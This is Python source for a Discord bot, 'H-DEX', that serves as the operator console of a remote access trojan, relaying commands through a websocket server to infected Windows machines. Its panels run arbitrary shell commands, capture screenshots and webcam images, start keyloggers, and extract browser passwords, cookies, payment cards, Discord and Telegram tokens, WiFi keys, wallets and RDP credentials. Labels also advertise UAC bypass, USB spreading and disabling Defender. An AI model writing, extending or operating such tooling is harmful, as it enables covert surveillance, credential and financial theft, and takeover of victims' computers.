"""
H-DEX Discord Bot - Control your H-Dex from Discord
Author: RealMrHecker
Version: 3.0 ULTRA
"""

import discord
from discord import app_commands
from discord.ext import commands, tasks
import asyncio
import websockets
import json
import logging
import os
import io
import base64
import time
import random
import requests
import ssl
import sys

# --- SAFETY DELAY ---
# Prevents rapid restart loops on shared hosts like Orihost/Pterodactyl.
# Without this, a 429 error leads to a restart loop that makes the ban permanent.
print("[*] H-DEX: Waiting 15 seconds for API stability...")
time.sleep(15)
from datetime import datetime, timedelta
from typing import Optional, Dict
from collections import defaultdict

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('H-DEX Bot')

# ═══════════════════════════════════════════════════════════════════════════════
# PROFESSIONAL COLOR SCHEME
# ═══════════════════════════════════════════════════════════════════════════════

class Colors:
    PRIMARY = 0x4F46E5      # Indigo
    SUCCESS = 0x10B981      # Emerald
    WARNING = 0xF59E0B      # Amber
    DANGER = 0xEF4444       # Red
    INFO = 0x6366F1         # Light Indigo
    MUTED = 0x64748B        # Slate

# Load config
def load_config():
    config_path = os.path.join(os.path.dirname(__file__), 'config.json')
    if os.path.exists(config_path):
        with open(config_path, 'r') as f:
            return json.load(f)
    return {
        "discord_token": "",
        "server_uri": "wss://web-production-31257.up.railway.app",
        "dashboard_token": "hdex_admin_2026"
    }

def save_config(config):
    config_path = os.path.join(os.path.dirname(__file__), 'config.json')
    with open(config_path, 'w') as f:
        json.dump(config, f, indent=4)

config = load_config()

def load_bans():
    try:
        if os.path.exists("bans.json"):
            with open("bans.json", "r") as f: return set(json.load(f))
    except: pass
    return set()

def save_bans(bans):
    try:
        with open("bans.json", "w") as f: json.dump(list(bans), f)
    except: pass

# Bot setup
intents = discord.Intents.default()
intents.message_content = True

# ═══════════════════════════════════════════════════════════════════════════════
# RATE LIMITER
# ═══════════════════════════════════════════════════════════════════════════════

class RateLimiter:
    def __init__(self, max_calls: int = 10, period: int = 30):
        self.max_calls = max_calls
        self.period = period
        self.calls: Dict[int, list] = defaultdict(list)
    
    def is_limited(self, user_id: int) -> bool:
        now = time.time()
        # Clean old entries
        self.calls[user_id] = [t for t in self.calls[user_id] if now - t < self.period]
        
        if len(self.calls[user_id]) >= self.max_calls:
            return True
        
        self.calls[user_id].append(now)
        return False
    
    def get_retry_after(self, user_id: int) -> float:
        if not self.calls[user_id]:
            return 0
        oldest = min(self.calls[user_id])
        return max(0, self.period - (time.time() - oldest))

rate_limiter = RateLimiter(max_calls=10, period=30)

class HDexBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix='!', intents=intents)
        self.websocket = None
        self.connected = False
        self.devices = {}
        self.selected_device = {}  # {user_id: device_id}
        self.pending_responses = {}  # {message_type: asyncio.Future}
        self.ws_task = None
        self.server_uri = config.get('server_uri', '')
        self.dashboard_token = config.get('dashboard_token', 'hdex_admin_2026')
        self.start_time = datetime.now()
        self.reconnect_attempts = 0
        self.max_reconnect_delay = 60
        self.command_history = []  # Recent commands
        self.device_groups = {}  # {group_name: [device_ids]}
        self.favorites = defaultdict(list)  # {user_id: [device_ids]}
        self.banned_devices = load_bans()
        logger.info(f"Loaded {len(self.banned_devices)} banned devices.")
        
    async def setup_hook(self):
        await self.tree.sync()
        logger.info("Slash commands synced!")

    async def on_ready(self):
        logger.info(f'✅ H-DEX Bot v3.0 ULTRA is online as {self.user}')
        self.update_presence.start()
        await self.change_presence(
            activity=discord.Activity(
                type=discord.ActivityType.watching, 
                name=f"H-DEX | {len(self.devices)} devices"
            )
        )
    
    @tasks.loop(minutes=1)
    async def update_presence(self):
        """Update bot presence with device count"""
        status = "Online" if self.connected else "Offline"
        await self.change_presence(
            activity=discord.Activity(
                type=discord.ActivityType.watching, 
                name=f"{len(self.devices)} devices | {status}"
            )
        )

bot = HDexBot()


# ═══════════════════════════════════════════════════════════════════════════════
# WEBSOCKET CONNECTION
# ═══════════════════════════════════════════════════════════════════════════════

async def handle_ws_messages():
    """Handle incoming WebSocket messages"""
    while bot.connected and bot.websocket:
        try:
            message = await bot.websocket.recv()
            data = json.loads(message)
            msg_type = data.get('type')
            
            # Filter out high-frequency stream frames to prevent log spam
            if msg_type not in ['screen_frame', 'webcam_frame', 'audio_chunk', 'metrics_data']:
                logger.info(f"📥 Received: {msg_type}")
            else:
                logger.debug(f"📥 Received Stream Frame: {msg_type}")
            
            if msg_type == 'device_list':
                bot.devices = {d['id']: d for d in data.get('devices', [])}
                logger.info(f"📱 Updated device list: {len(bot.devices)} devices")
                
            elif msg_type == 'auth_success':
                logger.info("🔐 Dashboard authenticated successfully")
                
            elif msg_type == 'screen_frame':
                sender = data.get('sender_id')
                if f"screenshot_{sender}" in bot.pending_responses:
                    future = bot.pending_responses.pop(f"screenshot_{sender}")
                    future.set_result(data.get('data'))
                    
            elif msg_type == 'command_output':
                sender = data.get('sender_id')
                if f"terminal_{sender}" in bot.pending_responses:
                    future = bot.pending_responses.pop(f"terminal_{sender}")
                    future.set_result(data.get('output', ''))
                    
            elif msg_type == 'sys_info':
                sender = data.get('sender_id')
                if f"sysinfo_{sender}" in bot.pending_responses:
                    future = bot.pending_responses.pop(f"sysinfo_{sender}")
                    future.set_result(data.get('data', {}))
                    
            elif msg_type == 'location_info':
                sender = data.get('sender_id')
                if f"location_{sender}" in bot.pending_responses:
                    future = bot.pending_responses.pop(f"location_{sender}")
                    future.set_result(data.get('data', {}))
                    
            elif msg_type == 'dir_list':
                sender = data.get('sender_id')
                if f"files_{sender}" in bot.pending_responses:
                    future = bot.pending_responses.pop(f"files_{sender}")
                    future.set_result(data)
                    
            elif msg_type == 'server_status':
                if 'server_status' in bot.pending_responses:
                    future = bot.pending_responses.pop('server_status')
                    future.set_result(data)
            
            elif msg_type == 'webcam_frame':
                sender = data.get('sender_id')
                if f"webcam_{sender}" in bot.pending_responses:
                    future = bot.pending_responses.pop(f"webcam_{sender}")
                    future.set_result(data.get('data'))
            
            elif msg_type == 'process_list':
                sender = data.get('sender_id')
                if f"processes_{sender}" in bot.pending_responses:
                    future = bot.pending_responses.pop(f"processes_{sender}")
                    future.set_result(data.get('processes', []))
                    
        except websockets.exceptions.ConnectionClosed:
            logger.warning("⚠️ WebSocket connection closed")
            bot.connected = False
            break
        except Exception as e:
            logger.error(f"❌ Error handling message: {e}")


async def connect_to_server(auto_reconnect: bool = False):
    """Connect to H-DEX server with optional auto-reconnect"""
    try:
        logger.info(f"🔄 Connecting to {bot.server_uri}...")
        ssl_context = ssl._create_unverified_context()
        bot.websocket = await websockets.connect(bot.server_uri, max_size=10*1024*1024, ssl=ssl_context)
        bot.connected = True
        bot.reconnect_attempts = 0  # Reset on successful connection
        
        # Authenticate as dashboard
        await bot.websocket.send(json.dumps({
            "type": "register_dashboard",
            "token": bot.dashboard_token
        }))
        
        logger.info("✅ Connected to H-DEX server!")
        
        # Start message handler
        bot.ws_task = asyncio.create_task(handle_ws_messages())
        
        return True
    except Exception as e:
        logger.error(f"❌ Connection failed: {e}")
        bot.connected = False
        
        if auto_reconnect:
            await auto_reconnect_handler()
        
        return False


async def auto_reconnect_handler():
    """Handle auto-reconnection with exponential backoff"""
    while not bot.connected and bot.reconnect_attempts < 10:
        bot.reconnect_attempts += 1
        delay = min(2 ** bot.reconnect_attempts + random.uniform(0, 1), bot.max_reconnect_delay)
        logger.info(f"🔄 Auto-reconnecting in {delay:.1f}s (attempt {bot.reconnect_attempts}/10)...")
        await asyncio.sleep(delay)
        
        try:
            bot.websocket = await websockets.connect(bot.server_uri, max_size=10*1024*1024)
            bot.connected = True
            bot.reconnect_attempts = 0
            
            await bot.websocket.send(json.dumps({
                "type": "register_dashboard",
                "token": bot.dashboard_token
            }))
            
            logger.info("✅ Reconnected to H-DEX server!")
            bot.ws_task = asyncio.create_task(handle_ws_messages())
            return
        except Exception as e:
            logger.error(f"❌ Reconnection failed: {e}")


async def disconnect_from_server():
    """Disconnect from H-DEX server"""
    bot.connected = False
    if bot.ws_task:
        bot.ws_task.cancel()
    if bot.websocket:
        await bot.websocket.close()
        bot.websocket = None
    logger.info("🔌 Disconnected from server")


async def send_to_server(data: dict):
    """Send data to H-DEX server"""
    if bot.websocket and bot.connected:
        await bot.websocket.send(json.dumps(data))
        return True
    return False


# ═══════════════════════════════════════════════════════════════════════════════
# EMBED HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def create_embed(title: str, description: str = "", color: int = Colors.PRIMARY):
    """Create a styled embed with professional colors"""
    embed = discord.Embed(
        title=title,
        description=description,
        color=color,
        timestamp=datetime.now()
    )
    embed.set_footer(text="H-DEX Ultra v3.0", icon_url="https://i.imgur.com/7jTTxlT.png")
    return embed


def get_uptime_str() -> str:
    """Get formatted bot uptime string"""
    delta = datetime.now() - bot.start_time
    days = delta.days
    hours, remainder = divmod(delta.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    if days > 0:
        return f"{days}d {hours}h {minutes}m"
    elif hours > 0:
        return f"{hours}h {minutes}m {seconds}s"
    else:
        return f"{minutes}m {seconds}s"


async def check_rate_limit(interaction: discord.Interaction) -> bool:
    """Check if user is rate limited, send message if so"""
    if rate_limiter.is_limited(interaction.user.id):
        retry_after = rate_limiter.get_retry_after(interaction.user.id)
        embed = create_embed(
            "⏳ Rate Limited",
            f"You're sending commands too fast!\nTry again in **{retry_after:.1f}s**",
            color=Colors.WARNING
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return True
    return False


def get_status_embed():
    """Create server status embed"""
    status = "🟢 Connected" if bot.connected else "🔴 Disconnected"
    color = 0x00FF7F if bot.connected else 0xFF4136
    
    embed = create_embed("🖥️ H-DEX Server Status", color=color)
    embed.add_field(name="Status", value=status, inline=True)
    embed.add_field(name="Devices", value=str(len(bot.devices)), inline=True)
    embed.add_field(name="Server", value=f"`{bot.server_uri[:50]}...`" if len(bot.server_uri) > 50 else f"`{bot.server_uri}`", inline=False)
    
    return embed


# ═══════════════════════════════════════════════════════════════════════════════
# DISCORD UI VIEWS
# ═══════════════════════════════════════════════════════════════════════════════

class DeviceSelectDropdown(discord.ui.Select):
    """Dropdown to select a device"""
    def __init__(self, devices: dict, user_id: int):
        options = []
        for dev_id, dev in devices.items():
            options.append(discord.SelectOption(
                label=dev.get('name', 'Unknown')[:25],
                description=f"IP: {dev.get('ip', 'Unknown')} | {dev_id[:15]}...",
                value=dev_id,
                emoji="🖥️"
            ))
        
        if not options:
            options.append(discord.SelectOption(label="No devices", value="none"))
            
        super().__init__(
            placeholder="Select a device...",
            options=options[:25],  # Max 25 options
            min_values=1,
            max_values=1
        )
        self.user_id = user_id

    async def callback(self, interaction: discord.Interaction):
        if self.values[0] == "none":
            await interaction.response.send_message("❌ No devices available!", ephemeral=True)
            return
            
        device_id = self.values[0]
        bot.selected_device[self.user_id] = device_id
        device = bot.devices.get(device_id, {})
        
        embed = create_embed(
            "✅ Device Selected",
            f"**{device.get('name', 'Unknown')}** is now selected.\n"
            f"You can now use device commands.",
            color=0x00FF7F
        )
        embed.add_field(name="Device ID", value=f"`{device_id}`", inline=False)
        embed.add_field(name="IP Address", value=device.get('ip', 'Unknown'), inline=True)
        
        await interaction.response.send_message(embed=embed, view=DeviceActionsView(device_id, self.user_id), ephemeral=True)


class TerminalModal(discord.ui.Modal, title="Execute Shell Command"):
    cmd_input = discord.ui.TextInput(
        label="Command",
        placeholder="whoami",
        style=discord.TextStyle.short,
        required=True
    )

    def __init__(self, device_id: str):
        super().__init__()
        self.device_id = device_id

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(thinking=True)
        command = self.cmd_input.value
        
        future = asyncio.get_event_loop().create_future()
        bot.pending_responses[f"terminal_{self.device_id}"] = future
        
        await send_to_server({
            "type": "shell_exec",
            "target_id": self.device_id,
            "command": command
        })
        
        try:
            data = await asyncio.wait_for(future, timeout=20)
            output = data
            
            if len(output) > 4000:
                output = output[:4000] + "\n...[Truncated]"
                
            embed = create_embed("💻 Terminal Output", f"Command: `{command}`")
            embed.description = f"```powershell\n{output}\n```"
            
            await interaction.followup.send(embed=embed)
        except asyncio.TimeoutError:
            await interaction.followup.send("❌ Command timed out!", ephemeral=True)


class CategoryDropdown(discord.ui.Select):
    """Dropdown to navigate between control panels"""
    def __init__(self, device_id: str, user_id: int, current: str = "system"):
        self.device_id = device_id
        self.user_id = user_id
        options = [
            discord.SelectOption(label="System Control", value="system", emoji="🖥️", description="Power, lock, terminal, processes", default=(current == "system")),
            discord.SelectOption(label="Data Extraction", value="data", emoji="🔐", description="Passwords, cookies, tokens, keys", default=(current == "data")),
            discord.SelectOption(label="Monitoring", value="monitor", emoji="📡", description="Clipboard, keylogger, window tracker", default=(current == "monitor")),
            discord.SelectOption(label="Pranks & Fun", value="pranks", emoji="🎭", description="BSOD, matrix, virus, jumpscare", default=(current == "pranks")),
            discord.SelectOption(label="Advanced", value="advanced", emoji="⚡", description="UAC bypass, USB spread, defender", default=(current == "advanced")),
        ]
        super().__init__(placeholder="📂 Select a control panel...", options=options, row=0)

    async def callback(self, interaction: discord.Interaction):
        category = self.values[0]
        device = bot.devices.get(self.device_id, {})
        dev_name = device.get('name', 'Unknown')

        panels = {
            "system": SystemPanel,
            "data": DataPanel,
            "monitor": MonitorPanel,
            "pranks": PranksPanel,
            "advanced": AdvancedPanel,
        }
        panel_titles = {
            "system": ("🖥️ System Control", "Power, terminal, processes, screenshots"),
            "data": ("🔐 Data Extraction", "Browser data, tokens, credentials, keys"),
            "monitor": ("📡 Live Monitoring", "Clipboard, keylogger, window tracker, crypto clipper"),
            "pranks": ("🎭 Pranks & Fun", "Visual effects, sounds, chaos mode"),
            "advanced": ("⚡ Advanced Tools", "UAC bypass, USB spread, network, defender"),
        }

        title, desc = panel_titles[category]
        embed = create_embed(title, f"**Device:** {dev_name}\n**Panel:** {desc}", color=Colors.PRIMARY)
        embed.set_footer(text=f"Device ID: {self.device_id[:20]}... | H-DEX v3.1")

        view_cls = panels[category]
        view = view_cls(self.device_id, self.user_id, category)
        await interaction.response.edit_message(embed=embed, view=view)


# ─── BASE PANEL ──────────────────────────────────────────────────────────────

class BasePanel(discord.ui.View):
    """Base for all category panels — includes the category dropdown"""
    def __init__(self, device_id: str, user_id: int, category: str):
        super().__init__(timeout=600)
        self.device_id = device_id
        self.user_id = user_id
        self.add_item(CategoryDropdown(device_id, user_id, current=category))

    async def _send_cmd(self, interaction, cmd_type, extra=None, msg="✅ Command sent!"):
        payload = {"type": cmd_type, "target_id": self.device_id}
        if extra:
            payload.update(extra)
        await send_to_server(payload)
        await interaction.response.send_message(msg, ephemeral=True)


# ─── SYSTEM PANEL ─────────────────────────────────────────────────────────────

class SystemPanel(BasePanel):
    """System control: power, terminal, screenshot, processes, files"""
    def __init__(self, device_id, user_id, category):
        super().__init__(device_id, user_id, category)

    @discord.ui.button(label="Terminal", emoji="💻", style=discord.ButtonStyle.primary, row=1)
    async def terminal_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(TerminalModal(self.device_id))

    @discord.ui.button(label="Screenshot", emoji="📸", style=discord.ButtonStyle.primary, row=1)
    async def screenshot_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True)
        future = asyncio.get_event_loop().create_future()
        bot.pending_responses[f"screenshot_{self.device_id}"] = future
        await send_to_server({"type": "take_screenshot", "target_id": self.device_id})
        try:
            b64_data = await asyncio.wait_for(future, timeout=15)
            img_data = base64.b64decode(b64_data)
            file = discord.File(io.BytesIO(img_data), filename="screenshot.png")
            embed = create_embed("📸 Screenshot Captured", f"Device: **{bot.devices.get(self.device_id, {}).get('name', 'Unknown')}**")
            embed.set_image(url="attachment://screenshot.png")
            await interaction.followup.send(embed=embed, file=file)
        except asyncio.TimeoutError:
            await interaction.followup.send("❌ Screenshot timed out!", ephemeral=True)

    @discord.ui.button(label="System Info", emoji="📊", style=discord.ButtonStyle.secondary, row=1)
    async def sysinfo_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True)
        future = asyncio.get_event_loop().create_future()
        bot.pending_responses[f"sysinfo_{self.device_id}"] = future
        await send_to_server({"type": "get_sys_info", "target_id": self.device_id})
        try:
            data = await asyncio.wait_for(future, timeout=10)
            embed = create_embed("📊 System Information")
            embed.add_field(name="💻 Hostname", value=data.get('hostname', 'Unknown'), inline=True)
            embed.add_field(name="🖥️ OS", value=f"{data.get('os', 'Unknown')} {data.get('version', '')}", inline=True)
            embed.add_field(name="⚙️ CPU", value=data.get('processor', 'Unknown')[:50], inline=False)
            ram = data.get('ram', {})
            embed.add_field(name="🧠 RAM", value=f"{ram.get('used', '?')}/{ram.get('total', '?')} ({ram.get('percent', 0)}%)", inline=True)
            await interaction.followup.send(embed=embed)
        except asyncio.TimeoutError:
            await interaction.followup.send("❌ Timed out!", ephemeral=True)

    @discord.ui.button(label="Location", emoji="📍", style=discord.ButtonStyle.secondary, row=1)
    async def location_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True)
        future = asyncio.get_event_loop().create_future()
        bot.pending_responses[f"location_{self.device_id}"] = future
        await send_to_server({"type": "get_location", "target_id": self.device_id})
        try:
            data = await asyncio.wait_for(future, timeout=10)
            embed = create_embed("📍 Device Location")
            embed.add_field(name="🌐 IP", value=data.get('query', 'Unknown'), inline=True)
            embed.add_field(name="🏙️ City", value=data.get('city', 'Unknown'), inline=True)
            embed.add_field(name="🌍 Country", value=data.get('country', 'Unknown'), inline=True)
            embed.add_field(name="📡 ISP", value=data.get('isp', 'Unknown'), inline=False)
            lat, lon = data.get('lat'), data.get('lon')
            if lat and lon:
                embed.add_field(name="🗺️ Maps", value=f"[Open Maps](https://www.google.com/maps/search/?api=1&query={lat},{lon})", inline=False)
            await interaction.followup.send(embed=embed)
        except asyncio.TimeoutError:
            await interaction.followup.send("❌ Timed out!", ephemeral=True)

    @discord.ui.button(label="Files", emoji="📁", style=discord.ButtonStyle.secondary, row=1)
    async def files_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True)
        future = asyncio.get_event_loop().create_future()
        bot.pending_responses[f"files_{self.device_id}"] = future
        await send_to_server({"type": "list_dir", "target_id": self.device_id, "path": "."})
        try:
            data = await asyncio.wait_for(future, timeout=10)
            items = data.get('items', [])
            embed = create_embed("📁 File Browser", f"**Path:** `{data.get('path', '.')}`")
            dirs = [i for i in items if i.get('is_dir')][:10]
            files = [i for i in items if not i.get('is_dir')][:10]
            if dirs:
                embed.add_field(name="Folders", value="\n".join([f"📁 {d['name']}" for d in dirs]), inline=False)
            if files:
                embed.add_field(name="Files", value="\n".join([f"📄 {f['name']}" for f in files]), inline=False)
            await interaction.followup.send(embed=embed)
        except asyncio.TimeoutError:
            await interaction.followup.send("❌ Timed out!", ephemeral=True)

    @discord.ui.button(label="Lock", emoji="🔒", style=discord.ButtonStyle.danger, row=2)
    async def lock_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "execute_command", {"command": "rundll32.exe user32.dll,LockWorkStation"}, "🔒 Device locked!")

    @discord.ui.button(label="Shutdown", emoji="⏻", style=discord.ButtonStyle.danger, row=2)
    async def shutdown_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "execute_command", {"command": "shutdown /s /t 0"}, "⏻ Shutdown sent!")

    @discord.ui.button(label="Restart", emoji="🔄", style=discord.ButtonStyle.danger, row=2)
    async def restart_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "execute_command", {"command": "shutdown /r /t 0"}, "🔄 Restart sent!")

    @discord.ui.button(label="Sleep", emoji="💤", style=discord.ButtonStyle.secondary, row=2)
    async def sleep_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "execute_command", {"command": "rundll32.exe powrprof.dll,SetSuspendState 0,1,0"}, "💤 Sleep sent!")

    @discord.ui.button(label="Processes", emoji="📋", style=discord.ButtonStyle.secondary, row=2)
    async def processes_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True)
        future = asyncio.get_event_loop().create_future()
        bot.pending_responses[f"processes_{self.device_id}"] = future
        await send_to_server({"type": "get_processes", "target_id": self.device_id})
        try:
            processes = await asyncio.wait_for(future, timeout=15)
            embed = create_embed("📋 Running Processes", f"**{len(processes)}** processes running")
            top = sorted(processes, key=lambda x: x.get('memory', 0), reverse=True)[:20]
            proc_list = "\n".join([f"`{p.get('pid', '?')}` {p.get('name', '?')[:30]}" for p in top])
            embed.add_field(name="Top 20 by Memory", value=proc_list or "No data", inline=False)
            await interaction.followup.send(embed=embed)
        except asyncio.TimeoutError:
            await interaction.followup.send("❌ Timed out!", ephemeral=True)


# ─── DATA PANEL ───────────────────────────────────────────────────────────────

class DataPanel(BasePanel):
    """Data extraction: passwords, cookies, tokens, keys"""
    def __init__(self, device_id, user_id, category):
        super().__init__(device_id, user_id, category)

    @discord.ui.button(label="Passwords", emoji="🔑", style=discord.ButtonStyle.danger, row=1)
    async def passwords_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "get_browser_passwords", msg="🔑 Extracting browser passwords...")

    @discord.ui.button(label="Cookies", emoji="🍪", style=discord.ButtonStyle.primary, row=1)
    async def cookies_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "get_browser_cookies", msg="🍪 Extracting cookies...")

    @discord.ui.button(label="History", emoji="🌐", style=discord.ButtonStyle.primary, row=1)
    async def history_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "get_browser_history", msg="🌐 Extracting browser history...")

    @discord.ui.button(label="Bookmarks", emoji="🔖", style=discord.ButtonStyle.primary, row=1)
    async def bookmarks_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "get_browser_bookmarks", msg="🔖 Extracting bookmarks...")

    @discord.ui.button(label="Autofill", emoji="📝", style=discord.ButtonStyle.primary, row=1)
    async def autofill_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "get_browser_autofill", msg="📝 Extracting autofill data...")

    @discord.ui.button(label="Cards", emoji="💳", style=discord.ButtonStyle.danger, row=2)
    async def cards_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "get_browser_cards", msg="💳 Extracting saved payment cards...")

    @discord.ui.button(label="Discord", emoji="🎮", style=discord.ButtonStyle.primary, row=2)
    async def discord_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "get_discord_tokens", msg="🎮 Grabbing Discord tokens...")

    @discord.ui.button(label="Telegram", emoji="✈️", style=discord.ButtonStyle.primary, row=2)
    async def telegram_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "get_telegram", msg="✈️ Extracting Telegram sessions...")

    @discord.ui.button(label="WiFi Keys", emoji="📶", style=discord.ButtonStyle.secondary, row=2)
    async def wifi_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "get_wifi", msg="📶 Extracting WiFi passwords...")

    @discord.ui.button(label="Wallets", emoji="💰", style=discord.ButtonStyle.secondary, row=2)
    async def wallets_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "scan_wallets", msg="💰 Scanning for crypto wallets...")

    @discord.ui.button(label="Product Keys", emoji="🔑", style=discord.ButtonStyle.secondary, row=3)
    async def productkeys_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "get_product_keys", msg="🔑 Extracting Windows/Office keys...")

    @discord.ui.button(label="RDP Creds", emoji="🖧", style=discord.ButtonStyle.secondary, row=3)
    async def rdp_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "get_saved_rdp", msg="🖧 Harvesting RDP credentials...")

    @discord.ui.button(label="Extensions", emoji="🧩", style=discord.ButtonStyle.secondary, row=3)
    async def extensions_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "get_browser_ext", msg="🧩 Listing browser extensions...")

    @discord.ui.button(label="Sensitive Files", emoji="📎", style=discord.ButtonStyle.secondary, row=3)
    async def sensdocs_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "find_docs", msg="📎 Scanning for sensitive documents...")


# ─── MONITORING PANEL ─────────────────────────────────────────────────────────

class MonitorPanel(BasePanel):
    """Monitoring: clipboard, keylogger, window tracker, crypto clipper"""
    def __init__(self, device_id, user_id, category):
        super().__init__(device_id, user_id, category)

    @discord.ui.button(label="▶ Keylogger", emoji="⌨️", style=discord.ButtonStyle.success, row=1)
    async def start_keylog_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "start_keylogger", msg="⌨️ Keylogger **STARTED**")

    @discord.ui.button(label="⏹ Keylogger", emoji="⌨️", style=discord.ButtonStyle.danger, row=1)
    async def stop_keylog_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "stop_keylogger", msg="⌨️ Keylogger **STOPPED**")

    @discord.ui.button(label="Dump Keylogs", emoji="📜", style=discord.ButtonStyle.secondary, row=1)
    async def dump_keylog_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "dump_keylogs", msg="📜 Fetching keylog data...")

    @discord.ui.button(label="Get Clipboard", emoji="📎", style=discord.ButtonStyle.secondary, row=2)
    async def get_clip_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "get_clipboard", msg="📎 Fetching current clipboard...")

    @discord.ui.button(label="Webcam Snap", emoji="📷", style=discord.ButtonStyle.primary, row=2)
    async def webcam_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True)
        future = asyncio.get_event_loop().create_future()
        bot.pending_responses[f"webcam_{self.device_id}"] = future
        await send_to_server({"type": "start_webcam_stream", "target_id": self.device_id})
        try:
            b64 = await asyncio.wait_for(future, timeout=15)
            await send_to_server({"type": "stop_webcam_stream", "target_id": self.device_id})
            img = base64.b64decode(b64)
            file = discord.File(io.BytesIO(img), filename="webcam.jpg")
            embed = create_embed("📷 Webcam Snapshot")
            embed.set_image(url="attachment://webcam.jpg")
            await interaction.followup.send(embed=embed, file=file)
        except asyncio.TimeoutError:
            if f"webcam_{self.device_id}" in bot.pending_responses:
                del bot.pending_responses[f"webcam_{self.device_id}"]
            await send_to_server({"type": "stop_webcam_stream", "target_id": self.device_id})
            await interaction.followup.send("❌ Webcam capture timed out!", ephemeral=True)


# ─── PRANKS PANEL ─────────────────────────────────────────────────────────────

class PranksPanel(BasePanel):
    """Pranks & Fun: visual effects, sounds, chaos"""
    def __init__(self, device_id, user_id, category):
        super().__init__(device_id, user_id, category)

    @discord.ui.button(label="Speak TTS", emoji="🔊", style=discord.ButtonStyle.primary, row=1)
    async def speak_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(SpeakModal(self.device_id))

    @discord.ui.button(label="Message Box", emoji="💬", style=discord.ButtonStyle.primary, row=1)
    async def message_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(MessageModal(self.device_id))

    @discord.ui.button(label="Fake BSOD", emoji="💀", style=discord.ButtonStyle.primary, row=1)
    async def fakebsod_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "fake_bsod", msg="💀 Fake Blue Screen launched!")

    @discord.ui.button(label="Matrix", emoji="🟢", style=discord.ButtonStyle.success, row=1)
    async def matrix_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "ultra_matrix", msg="🟢 Matrix effect activated!")

    @discord.ui.button(label="Virus Prank", emoji="☣️", style=discord.ButtonStyle.danger, row=1)
    async def virus_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "prank_virus", msg="☣️ Virus prank triggered!")

    @discord.ui.button(label="Crazy Mouse", emoji="🖱️", style=discord.ButtonStyle.secondary, row=2)
    async def mouse_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "crazy_mouse", msg="🖱️ Crazy mouse for 10 seconds!")

    @discord.ui.button(label="Open CD", emoji="💿", style=discord.ButtonStyle.secondary, row=2)
    async def cd_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "open_cd", msg="💿 CD tray opened!")

    @discord.ui.button(label="Beep", emoji="🔔", style=discord.ButtonStyle.secondary, row=2)
    async def beep_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "beep", msg="🔔 Beep sent!")

    @discord.ui.button(label="Monitor Off", emoji="🖥️", style=discord.ButtonStyle.secondary, row=2)
    async def monoff_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "monitor_off", msg="🖥️ Monitor off!")

    @discord.ui.button(label="Hide Taskbar", emoji="📌", style=discord.ButtonStyle.secondary, row=2)
    async def hidetaskbar_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "hide_taskbar", msg="📌 Taskbar hidden!")

    @discord.ui.button(label="Block Input", emoji="🚫", style=discord.ButtonStyle.danger, row=3)
    async def block_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "block_input_enhanced", msg="🚫 Input BLOCKED!")

